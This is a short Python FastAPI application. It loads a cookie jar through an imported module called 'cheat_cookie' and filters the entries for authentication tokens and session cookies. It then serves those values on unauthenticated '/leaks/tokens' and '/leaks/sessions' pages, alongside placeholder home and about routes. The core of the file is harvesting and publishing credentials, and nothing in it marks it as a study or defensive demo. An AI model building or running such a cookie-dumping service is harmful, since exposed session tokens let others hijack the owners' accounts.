
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles

app = FastAPI()

app.mount("/media", StaticFiles(directory="media/"), name="media")
templates = Jinja2Templates(directory="templates/")

############################################## utils #########################################
import cheat_cookie as cc

cj = cc.load()

cjl = [str(x) for x in cj]

tokens = []
for x in cjl:
    if 'token' in x:
        tokens.append(x)
        # print(x)

sessions = []
for x in cjl:
    if 'session' in x.lower():
        sessions.append(x)
        # print(x)
############################################## utils #########################################

@app.get("/home")
@app.get("/index")
async def home(request: Request):
    result = "Type a number"
    return templates.TemplateResponse('index.html', context={'request': request, 'result': result})

@app.get("/websites")
async def websites(request: Request):
    result = "Type a number"
    return templates.TemplateResponse('websites.html', context={'request': request, 'result': result})

@app.get("/leaks")
async def leaks(request: Request):
    result = {}
    return templates.TemplateResponse('leaks.html', context={'request': request, 'result': result})

@app.get("/leaks/tokens")
async def leaks(request: Request):
    result = {'tokens': tokens}
    return templates.TemplateResponse('leaks.html', context={'request': request, 'result': result})

@app.get("/leaks/sessions")
async def leaks(request: Request):
    result = {'sessions': sessions}
    return templates.TemplateResponse('leaks.html', context={'request': request, 'result': result})

@app.get("/about")
async def about(request: Request):
    result = "Type a number"
    return templates.TemplateResponse('about.html', context={'request': request, 'result': result})